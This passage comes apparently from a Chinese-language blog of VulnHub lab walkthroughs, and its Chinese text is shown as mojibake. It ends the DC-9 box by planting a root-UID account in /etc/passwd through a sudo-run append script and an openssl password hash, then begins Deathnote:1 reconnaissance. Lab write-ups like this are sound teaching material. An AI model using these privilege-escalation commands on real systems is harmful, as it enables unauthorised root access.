<p><code>-type</code> fä»£è¡¨ç±»å‹ä¸ºæ–‡ä»¶ï¼Œdä¸ºç›®å½•<br><code>2&gt;/dev/null</code>äº§ç”Ÿæ›´æ¸…æ™°çš„è¾“å‡ºï¼Œå› ä¸ºå®ƒä¼šä¸¢å¼ƒé”™è¯¯ï¼Œä¾‹å¦‚æƒé™é”™è¯¯</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></p>
<p>æˆ‘ä»¬åˆ°æ–‡ä»¶ç›®å½•ä¸‹æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<h3><span id="pyè„šæœ¬åˆ©ç”¨">pyè„šæœ¬åˆ©ç”¨</span></h3><p><code>è„šæœ¬æ¥å—äº†ä¸¤ä¸ªä½ç½®å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œé™„åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶çš„å†…å®¹ä¸­</code></p>
<p>å…¶å®å¦‚æœæˆ‘ä»¬æœ‰ä¿®æ”¹è„šæœ¬çš„æƒé™å°±å¥½äº†ï¼Œå¯ä»¥æ”¹æˆæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨è¿™ä¸ªç›®å½•å†™å…¥çš„æƒé™</p>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œå°±åˆ©ç”¨è„šæœ¬çš„æŠŠä¸€ä¸ªæ–‡æœ¬å†…å®¹é™„åŠ åˆ°å¦å¤–æ–‡æœ¬çš„èƒ½åŠ›ï¼Œä¿®æ”¹æˆ‘ä»¬æ— æ³•ä¿®æ”¹çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>/etc/passwd</code></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>/etc/passwd</code>é‡Œ<code>root</code>ç”¨æˆ·çš„æ ¼å¼</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></p>
<p>æŒ‰è¿™ä¸ªæ ¼å¼æˆ‘ä»¬å†™ä¸€ä¸ªè‡ªå·±çš„</p>
<blockquote>
<p><code>ttoc::0:0:root:/root:/bin/bash</code><br>æˆ‘è¿™é‡Œè®¾ç½®çš„ç”¨æˆ·ttocå¯†ç ä¸ºç©º</p>
</blockquote>
<hr>
<h4><span id="opensslåŠ ç›"><code>openssl</code>åŠ ç›</span></h4><p>å…¶å®è¿™é‡Œæ˜¯éœ€è¦ç»™æˆ‘ä»¬çœŸå‡çš„ç”¨æˆ·æ·»åŠ å¯†ç çš„</p>
<p>ä¸ç„¶æ˜¯é€šè¿‡ä¸äº†å¯†ç è¾“å…¥é‚£ä¸€ç¯ï¼Œé‚£é‡Œä¸å…è®¸å¯†ç ä¸ºç©º</p>
<p>æˆ‘ä»¬æ‰§è¡Œ</p>
<blockquote>
<p><code>openssl passwd -1 -salt salt password</code></p>
<p><code>-1</code>ä½¿ç”¨ä»€ä¹ˆå“ˆå¸Œç®—æ³•ã€‚åœ¨æˆ‘ä»¬çš„ç”¨ä¾‹ä¸­ï¼Œè¿™æ— å…³ç´§è¦ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ MD5ï¼Œåœ¨ç°å®ä¸–ç•Œçš„ PT ä¸­åº”è¯¥é¿å…ä½¿ç”¨ MD5ï¼Œå› ä¸ºå®ƒä¸å®‰å…¨ã€‚</p>
<p><code>-salt</code> saltç”¨ä½œç›çš„å­—ç¬¦ä¸²ã€‚æˆ‘é€‰æ‹©å­—ç¬¦ä¸²ç›</p>
<p><code>password</code>æˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ˜æ–‡å¯†ç </p>
</blockquote>
<p>å¾—åˆ°</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„å¦‚æœå¼€å§‹æ²¡åŠ å¯†ç å°±ä¼ å…¥&#x2F;etc&#x2F;passwdï¼Œåé¢ä¿®æ”¹åå†ä¼ ç”¨æˆ·ï¼Œåå­—ä¸èƒ½ç›¸åŒ</strong></p>
<hr>
<p>ä½†æ˜¯æ³¨æ„æˆ‘ä»¬å…¶å®åœ¨å¾ˆå¤šç›®å½•ä¸‹éƒ½æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ç»å…¸ä½¿ç”¨</p>
<p><code>/tmp</code>ï¼Œä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹çš„æƒé™ç®¡æ§ä¸€èˆ¬ä¸å¤§</p>
<p>äºæ˜¯æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„å†…å®¹å†™å…¥<code>/tmp</code>ç›®å½•ä¸‹çš„<code>evil</code>æ–‡ä»¶ä¸­</p>
<blockquote>
<p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p>
<p>*æ³¨æ„è¿™é‡Œéœ€è¦å•å¼•å·ï¼ŒåŒå¼•å·ä¼šæŠŠ$åé¢å‚æ•°å½“ä½œå˜é‡</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬å†æ‰§è¡Œ</p>
<blockquote>
<p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p>
<p>æŠŠæˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·rootæ·»åŠ åˆ°æ–‡æœ¬å»</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></p>
<p>æœ€åç™»å½•<code>ttoc</code></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></p>
<p>æˆåŠŸæå–</p>
<p>è¯»å–<code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•     â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations - you have done well to get to this point.</code></p>
<p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p>
<p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p>
<p><code>They are an inspirational bunch of fellows.</code></p>
<p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p>
<p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p>
<p><code>So long, and thanks for all the fish.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œ - ä½ å·²ç»å®Œæˆäº†è¿™ä¸€ç‚¹ã€‚</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-9ã€‚åªæ˜¯æƒ³å¯¹æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>ä»–ä»¬èŠ±æ—¶é—´å®Œæˆäº†å„ç§ DC æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¿˜è¦å‘@m0tl3ycr3w çš„å„ä¸ªæˆå‘˜è¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢ã€‚</p>
<p>ä»–ä»¬æ˜¯ä¸€ç¾¤é¼“èˆäººå¿ƒçš„äººã€‚</p>
<p>å½“ç„¶ï¼Œå®ƒä»¬å¯èƒ½ä¼šé—»åˆ°ä¸€ç‚¹å‘³é“ï¼Œä½†æ˜¯â€¦â€¦å¼€ç©ç¬‘ã€‚ :-)</p>
<p>å¯æ‚²çš„æ˜¯ï¼Œä¸€åˆ‡éƒ½å¿…é¡»ç»“æŸï¼Œè¿™å°†æ˜¯æœ€åä¸€æ¬¡<br>DCç³»åˆ—ä¸­çš„æŒ‘æˆ˜ã€‚</p>
<p>è¿™ä¹ˆä¹…ï¼Œæ„Ÿè°¢æ‰€æœ‰çš„é±¼ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<p>ã€dcç³»åˆ—ç»“æŸï¼Œé˜…è¯»åˆ°æœ¬æ–‡çš„æœ‹å‹ï¼Œå¸Œæœ›å¯¹ä½ ä»¬æœ‰æ‰€å¸®åŠ©ã€‘</p>
<hr>
<h1><span id="else">ELSE</span></h1><h1><span id="ä¸€-deathnote-1åˆçº§">ä¸€ã€DEATHNOTE: 1[åˆçº§]</span></h1><p>åŸºæ‹‰å¥½å¸…ï¼Œå¿…é¡»æ‹¿è¿™ä¸ªå¼€å¤´ï¼Œç›´æ¥ææƒè¿›ä»–çš„å¿ƒã€ä¸æ˜¯å—é€šã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></p>
<blockquote>
<p>hint:<br>ä¸è¦æµªè´¹å¤ªå¤šæ—¶é—´è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚è¿™æ˜¯ä¸€ä¸ªç›´æˆªäº†å½“çš„ç›’å­ã€‚</p>
</blockquote>
<hr>
<p>æ‰¾è¿™ä¸ªé¶åœº<code>ip</code>ï¼Œå°±æŠŠæˆ‘å¡ä½äº†ï¼Œåé¢çœ‹åˆ°å¥½åƒè¿™ä¸ªé¶æœºå’Œ<code>vm</code>ä¸å…¼å®¹ï¼Œåªèƒ½ç”¨<code>vitrualbox</code></p>
<p>åé¢ä¸‹äº†ä¸ª<code>vitrualbox</code>æ‰æ‰¾åˆ°é¶æœº<code>ip</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></p>
<p>ç„¶å<code>vm</code>ä¹Ÿæ¡¥æ¥ï¼Œå°±æ‰¾åˆ°äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></p>
<p>é¡ºå¸¦è¡¥å……ä¸¤ä¸ªæ‰«æå·¥å…·ã€ä½¿ç”¨è‡ªè¡Œ<code>-h</code>æŸ¥çœ‹ã€‘ã€æ„Ÿè§‰å’Œ<code>nmap</code>å·®ä¸å¤šã€‘</p>
<blockquote>
<p><code>arp-scan</code>æ˜¯Kali Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDR<br>åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œ<code>è¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬</code><br><code>ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚</code></p>
<p><code>netdiscover</code><br>Netdiscoveræ˜¯ä¸€ç§ç½‘ç»œæ‰«æå·¥å…·ï¼Œé€šè¿‡ARPæ‰«æå‘ç°æ´»åŠ¨ä¸»æœºï¼Œå¯ä»¥é€šè¿‡ä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼è¿›è¡ŒARPæ‰«æã€‚é€šè¿‡ä¸»åŠ¨å‘é€ARPè¯·æ±‚æ£€æŸ¥ç½‘ç»œARPæµé‡ï¼Œé€šè¿‡è‡ªåŠ¨æ‰«ææ¨¡å¼æ‰«æç½‘ç»œåœ°å€ã€‚æœ¬æ–‡ä»‹ç»Netdiscoverçš„å®‰è£…å’Œä½¿ç”¨æ–¹æ³•ã€‚</p>
</blockquote>
<hr>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>ä¹ æƒ¯<code>nmap</code>æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></p>
<blockquote>
<p><code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>ssh</code><br><code>80</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>http</code></p>
</blockquote>
<p>ç„¶åè®¿é—®é¶æœº<code>ip</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></p>
<p>çœ‹åˆ°é¡µé¢æ˜¾ç¤º<code>please wait.....</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></p>
<p>ç„¶åæ˜¾ç¤ºè¿æ¥å¤±è´¥</p>
<p>çœ‹æ¥æ˜¯éœ€è¦ä¿®æ”¹<code>/etc/hosts</code>æ–‡ä»¶ï¼Œæ·»åŠ é¶æœºåŸŸåå’Œ<code>ip</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></p>
<p>å†æ¬¡è®¿é—®é¶æœº<code>ip</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></p>
<p>è®¿é—®æˆåŠŸ</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹ç½‘ç«™çš„æ¡†æ¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></p>
<blockquote>
<p><code>CMS</code>ä¸º<code>wordpress 5.8</code>ï¼Œå¾ˆè€çš„ç‰ˆæœ¬äº†ï¼Œè¿™é‡Œè‚¯å®šæœ‰ææƒçš„æ–¹å¼</p>
<p>é‡‡ç”¨è„šæœ¬ä¸º<code>Twiiter Emoji</code>ï¼Œè¿™æ˜¯æ¨ç‰¹çš„å¼€æºåº“é‡Œçš„å¼•ç”¨è¡¨æƒ…çš„è„šæœ¬ï¼Œä¸æ˜¯å…³é”®</p>
</blockquote>
<p>æˆ‘ä»¬çœ‹åˆ°é¡µé¢æœ‰<code>hint</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></p>
<blockquote>
<p><code>Find a notes.txt file on server or SEE the L comment</code> </p>
<p>æ„æ€æ˜¯ï¼š</p>
<p>æ‰¾åˆ°ä¸€ä¸ªnotes.txt æ–‡ä»¶æœåŠ¡å™¨ä¸Š<br>æˆ–</p>
<p>çœ‹çœ‹Lçš„è¯„è®º </p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°notes.txtæ–‡ä»¶åœ¨å“ªé‡Œï¼Œä»¥åŠè¯„è®ºç½‘é¡µåœ¨å“ªé‡Œ</p>
</blockquote>
<p>è¯„è®ºé¡µé¢æˆ‘æ˜¯åœ¨é¦–é¡µé¢ä¸­é—´</p>
<blockquote>
<p><code>i will eliminate you L!</code></p>
</blockquote>
<p>é“¾æ¥è·³è½¬æ‰¾åˆ°çš„ï¼Œä½†å¥½åƒæ²¡å•¥ä¿¡æ¯ï¼Œä¼¼ä¹çœ‹ä¸åˆ°<code>L</code>çš„è¯„è®º</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></p>
<p>å·¦ä¸‹è§’çš„</p>
<blockquote>
<p><code>my fav line is iamjustic3</code></p>
<p><code>L on i will eliminate you L!</code></p>
<p>æˆ‘æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code><br><code>L</code> åœ¨ ï¼Œæˆ‘ä¼šæ¶ˆç­ä½ L! </p>
<p><code>iamjustic3</code>ï¼šåˆ†å¼€çœ‹i am justic 3ã€æˆ‘æ˜¯æ­£ä¹‰çš„3ã€‘ï¼Œä½†å¥½åƒå®é™…æ„æ€ï¼Œåé¢çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨çš„</p>
<p><code>eliminate</code>ï¼šæ¶ˆç­ï¼Œçº¯ç²¹å•è¯æ„æ€ï¼Œæ²¡å•¥æ„ä¹‰</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹æ‰¾ä¸€ä¸‹ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></p>
<h3><span id="å…³é”®ä¿¡æ¯">*å…³é”®ä¿¡æ¯</span></h3><p>å…³é”®ç™»å½•é¡µé¢å’Œ<code>robots.txt</code>ã€å…¶ä»–é¡µé¢æ²¡æœ‰å•¥ä¿¡æ¯ã€‘</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></p>
<p>çˆ¬è™«æ–‡æœ¬</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></p>
<blockquote>
<p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p>
<p><code>ryuk please delete it</code><br>æ„æ€æ˜¯ï¼š<br>xæˆ‘çš„çˆ¸çˆ¸<br>ä»–æŠŠæš—ç¤ºè—åœ¨äº†<code>/important.jpg</code>é‡Œ</p>
<p>ryukï¼Œè¯·åˆ äº†å®ƒ</p>
<p>ryukæ˜¯åŸºæ‹‰çš„æ­»ç¥ï¼ŒåŸºæ‹‰è®©ä»–åˆ é™¤å›¾ç‰‡ï¼ŒåŒæ—¶å›¾ç‰‡ä¹Ÿè—æœ‰ä¿¡æ¯<br>è™½ç„¶æˆ‘ä»¬æ‰¾åˆ°äº†ç™»å½•é¡µé¢ï¼Œä»¥åŠç”¨æˆ·åï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“å¯†ç <br>æ‰€ä»¥è¿˜è¦æ‰¾å¯†ç </p>
</blockquote>
<p>æˆ‘ä»¬å…ˆè¯•è¯•æˆ‘ä»¬èƒ½ä¸èƒ½æŸ¥çœ‹<code>/important.jpg</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></p>
<p>å‘ç°å›¾ç‰‡æ— æ³•æ˜¾ç¤º</p>
<p>çœ‹æ¥å›¾ç‰‡æ ¼å¼æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯æ’å…¥äº†æ–‡æœ¬ä»€ä¹ˆçš„</p>
<p>æˆ‘ä»¬ç”¨<code>curl</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>deathnote.vuln/important.jpg</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></p>
<blockquote>
<p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p>
<p><code>i can only help you by giving something important</code></p>
<p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æˆ‘æ˜¯å…‰çš„çˆ¶äº² å…«ç¥å®—ä¸€éƒ<br>æˆ‘æ€€ç–‘ L å…³äºå…‰æ˜¯ kira çš„å‡è®¾æ˜¯å¦æ­£ç¡®</p>
<p>æˆ‘åªèƒ½é€šè¿‡æä¾›ä¸€äº›é‡è¦çš„ä¸œè¥¿æ¥å¸®åŠ©ä½ </p>
